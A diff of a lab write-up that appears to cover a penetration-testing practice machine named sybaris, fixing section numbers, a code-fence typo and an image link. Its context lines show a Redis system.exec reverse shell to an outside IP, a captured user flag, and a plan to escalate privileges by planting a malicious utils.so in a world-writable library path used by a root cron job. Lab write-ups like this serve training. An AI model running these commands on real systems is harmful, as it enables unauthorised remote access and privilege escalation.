@@ -96,8 +96,9 @@ system.exec "/bin/bash -i >& /dev/tcp/192.168.45.247/6379 0>&1"
 ```
 ![](images/2025-08-31_5.png)
 
-### 3.4 User flag: 
-The `local.txt` was found under the user `pablo` which was observed on the http port 80 page at the bottom of the htmly blog. 
+### 3.3 User flag: 
+The `local.txt` was found under the user `pablo/home` 
+
 ```bash
 b121bce5024edff1ba2031af87ff6c12
 ```
@@ -121,7 +122,7 @@ We also note that this crontab file includes a custom `LD_LIBRARY_PATH` variab
 
 ![](images/2025-08-31_8.png)
 
-```basj
+```bash
 [pablo@sybaris tmp]$ ls -lah /usr/local/lib/dev
 total 0
 drwxrwxrwx  2 root root  6 Sep  7  2020 .
@@ -137,7 +138,7 @@ drwxr-xr-x. 4 root root   30 Sep  7  2020 ..
 ```
 The list of shared objects loaded by **/usr/bin/log-sweeper** includes the **utils.so** shared object which may be a good candidate for hijacking.
 
-![](images/2025-08-31_10.png0
+![](images/2025-08-31_10.png)
 
 ## 4.2 Exploit Cron Job
 To exploit out `log_sweeper` cron job, all we need to do is generate a milicious shared object file named `utils.so` and place it in the `/usr/local/lib/dev` directory. First, we'll generate out malicious payload shareed object `.so` file.
